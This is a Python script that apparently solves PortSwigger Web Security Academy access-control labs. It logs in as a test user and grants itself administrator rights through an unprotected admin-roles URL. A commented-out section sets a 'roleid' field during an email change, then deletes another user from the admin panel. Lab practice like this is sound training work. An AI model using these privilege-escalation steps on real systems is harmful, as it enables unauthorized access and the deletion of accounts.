import requests
from bs4 import BeautifulSoup

site = 'ac5b1f1d1eea38bd800bb785005a0066.web-security-academy.net'
s = requests.Session()

login_url = f'https://{site}/login'
login_data = {'password': 'peter', 'username': 'wiener'}
resp = s.post(login_url, data=login_data)

upgrade_data = {
    'action': 'upgrade',
    'username': 'wiener'
}

url = f'https://{site}/admin-roles?username=wiener&action=upgrade'
url_2 = f'https://{site}/admin'
resp = s.get(url)
resp = s.get(url_2)
print(resp.status_code)
# print(resp.text)


"""site = 'ac3a1fdf1f277524800f73e1002e007d.web-security-academy.net'
s = requests.Session()
login_url = f'https://{site}/login'
login_data = {'password': 'peter', 'username': 'wiener'}
resp = s.post(login_url, data=login_data)

change_url = f'https://{site}/my-account/change-email'
json_data = {'email': 'semchuk2@pdx.edu'}
resp = s.post(change_url, json=json_data, allow_redirects=False)
print(resp.status_code)
print(resp.text)

json_data = {'email': 'semchuk2@pdx.edu', 'roleid': 2}
resp = s.post(change_url, json=json_data, allow_redirects=False)
print(resp.text)

admin_url = f'https://{site}/admin'
resp = s.get(admin_url)
soup = BeautifulSoup(resp.text, 'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')
"""
